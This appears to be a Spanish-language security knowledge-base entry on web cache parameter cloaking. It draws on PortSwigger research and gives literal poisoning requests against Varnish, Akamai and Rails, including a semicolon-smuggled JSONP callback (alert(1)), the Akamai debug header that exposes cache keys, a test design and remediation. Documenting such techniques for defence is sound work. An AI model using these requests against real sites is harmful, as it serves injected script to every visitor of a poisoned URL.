---
clase: otra
tech: varnish-akamai-rails
cwe: CWE-444
cvss: 7.5 # [derivado] sin recompensa ni CVE indicados en la fuente
payload: |
  # ADVERTENCIA (H1): el render colapso los saltos de linea.
  #
  # ---- VARNISH ----
  # La regla VCL que crea el agujero, LITERAL de la fuente. Elimina el parametro '_':
  set req.http.hash_url = regsuball(             req.http.hash_url,             "\?_=[^&]+&",             "?");
  #
  # Peticion normal:
  GET /search?q=help?!&search=1 HTTP/1.1
  Host: example.com
  # Peticion con parametro OCULTO a la clave:
  GET /search?q=help?_=payload&!&search=1 HTTP/1.1
  Host: example.com
  # El regex borra '?_=payload&' al construir la clave, asi que la clave no contiene
  # el payload — pero la aplicacion SI lo recibe.
  #
  # ---- AKAMAI ----
  # Mismo parametro, dos separadores. LITERALES de la fuente:
  GET /en?x=1&akamai-transform=payload-goes-here HTTP/1.1
  Host: redacted.com
  #   -> X-True-Cache-Key: /L/redacted.akadns.net/en?x=1 vcd=1234 cid=__
  GET /en?x=1?akamai-transform=payload-goes-here HTTP/1.1
  Host: redacted.com
  #   -> X-True-Cache-Key: /L/redacted.akadns.net/en?x=1 vcd=1234 cid=__
  # Las DOS producen la MISMA clave, pero la segunda usa '?' como separador, que
  # Akamai no reconoce para excluir el parametro.
  #
  # ---- RUBY ON RAILS ----
  # Rails trata el punto y coma como DELIMITADOR de parametros. LITERAL de la fuente:
  /?param1=test&param2=foo
  /?param1=test;param2=foo
  # Explotacion LITERAL (el ';' esconde un segundo 'callback' de la clave):
  GET /jsonp?callback=legit&utm_content=x;callback=alert(1)// HTTP/1.1
  Host: example.com
  #   -> HTTP/1.1 200 OK
  #      alert(1)//(some-data)
  # Despues, la peticion limpia sirve la respuesta envenenada:
  GET /jsonp?callback=legit HTTP/1.1
  Host: example.com
  #   -> HTTP/1.1 200 OK
  #      X-Cache: HIT
  #      alert(1)//(some-data)
precondicion: "La cache EXCLUYE deliberadamente ciertos parametros de la clave (por rendimiento: parametros de analitica, cache-busters, transformaciones de imagen) y la aplicacion los procesa igualmente. El atacante esconde su payload dentro de un parametro excluido, o aprovecha que la cache y la aplicacion usan DELIMITADORES distintos."
como_se_descubre: |
  Oraculo de clave de cache. Akamai expone la clave directamente con una cabecera de
  depuracion, LITERAL de la fuente:
  #   Pragma: akamai-x-get-cache-key, akamai-x-get-true-cache-key
  # Respuesta: X-Cache-Key, X-Cache-Key-Extended-Internal-Use-Only, X-True-Cache-Key
  Con la clave visible, el trabajo deja de ser adivinanza: se compara que entra en la
  clave y que llega a la aplicacion, y la diferencia ES la vulnerabilidad.
  Sin oraculo, metodologia LITERAL de la fuente: 'Each question is asked by issuing two
  slightly different requests and observing whether the second one causes a cache hit,
  indicating that it was issued with the same cache key as the first.'
control_negativo: |
  # [derivado] diseño de test A/B
  # A: GET /?x=1&param-excluido=PAYLOAD  -> la respuesta refleja PAYLOAD
  # B: GET /?x=1                          -> si devuelve PAYLOAD con X-Cache: HIT,
  #    la clave de A y B es la MISMA = parametro oculto confirmado
  # C: GET /?x=1&otro-param=PAYLOAD (un parametro que SI entra en la clave)
  #    -> B debe seguir limpio. Aisla que el agujero es de ESE parametro concreto.
  # El control C importa para el informe: identifica QUE parametro se excluye, dato
  # que el equipo necesita para corregir la configuracion de cache.
mata: |
  - La cache no excluye ningun parametro de la clave.
  - La aplicacion ignora los parametros excluidos.
  - Cache y aplicacion usan los MISMOS delimitadores (sin el caso del ';' de Rails).
  - Akamai ya corrigio el caso 'akamai-transform' (la fuente indica parcheado).
  - El paso B no devuelve el payload -> el parametro si entra en la clave.
fuente: "https://portswigger.net/research/web-cache-entanglement (James Kettle, 2020-08-05, act. 2025-09-03). Regex VCL, peticiones, claves de Akamai y el caso de Rails literales. Akamai: 'akamai-transform' parcheado tras el reporte. Objetivo de Rails no nombrado. Sin recompensas ni CVE indicados."
confianza: media
fecha: 2026-11-02
---
# [CACHÉ] Cache parameter cloaking — esconder el payload en un parámetro que la clave ignora

## Principio
Las cachés excluyen deliberadamente ciertos parámetros de la clave, por rendimiento:
parámetros de analítica, cache-busters, transformaciones de imagen. La aplicación, en
cambio, los procesa como cualquier otro. El atacante esconde su payload **dentro** de un
parámetro excluido, y la respuesta envenenada se archiva bajo una clave limpia.

Hay una segunda variante más sutil: caché y aplicación usan **delimitadores distintos**,
así que lo que para una es un solo parámetro, para la otra son dos.

## Payload
**Varnish.** La regla VCL que crea el agujero, eliminando el parámetro `_` de la clave:

```
set req.http.hash_url = regsuball(             req.http.hash_url,             "\?_=[^&]+&",             "?");
```

```http
GET /search?q=help?_=payload&!&search=1 HTTP/1.1
Host: example.com
```

**Akamai.** El mismo parámetro con dos separadores produce la **misma clave**, pero solo
una forma se excluye:

```http
GET /en?x=1&akamai-transform=payload-goes-here HTTP/1.1
GET /en?x=1?akamai-transform=payload-goes-here HTTP/1.1
```

Las dos dan `X-True-Cache-Key: /L/redacted.akadns.net/en?x=1 vcd=1234 cid=__`.

**Ruby on Rails.** Rails trata el **punto y coma** como delimitador de parámetros:

```
/?param1=test&param2=foo
/?param1=test;param2=foo
```

Lo que permite esconder un segundo `callback` dentro de un parámetro de analítica:

```http
GET /jsonp?callback=legit&utm_content=x;callback=alert(1)// HTTP/1.1
```
→ `alert(1)//(some-data)`

Y después, la petición limpia sirve lo envenenado:

```http
GET /jsonp?callback=legit HTTP/1.1
```
→ `X-Cache: HIT` con `alert(1)//(some-data)`

## El oráculo de clave cambia el trabajo por completo
Akamai expone su clave de caché con una cabecera de depuración:

```http
Pragma: akamai-x-get-cache-key, akamai-x-get-true-cache-key
```

y devuelve `X-Cache-Key`, `X-Cache-Key-Extended-Internal-Use-Only` y `X-True-Cache-Key`.
Con la clave visible, el trabajo deja de ser adivinanza: se compara **qué entra en la
clave** con **qué llega a la aplicación**, y la diferencia *es* la vulnerabilidad. Es el
mejor ejemplo de por qué la fuente estructura su metodología alrededor de "seleccionar
un oráculo de caché" como primer paso.

Sin oráculo, la metodología literal es: *"Each question is asked by issuing two slightly
different requests and observing whether the second one causes a cache hit, indicating
that it was issued with the same cache key as the first."*

## Impacto
Envenenamiento de caché con payload arbitrario sobre una clave que parece limpia. El
caso de Rails produce ejecución de JavaScript servida desde la caché a todos los
usuarios de una URL legítima.

## Remediación
De la fuente: *"avoid ever rewriting the cache key. Instead, rewrite the actual
request"*. Es la corrección exacta de esta clase — el problema nace precisamente de que
la clave se reescribe con un regex mientras la petición sigue intacta.

`# [derivado]`: si hay que excluir parámetros por rendimiento, la exclusión debe
aplicarse **también a la petición** que se reenvía al origen, de modo que la aplicación
no vea lo que la clave no ve. Y la normalización de delimitadores debe ser idéntica en
ambas capas.
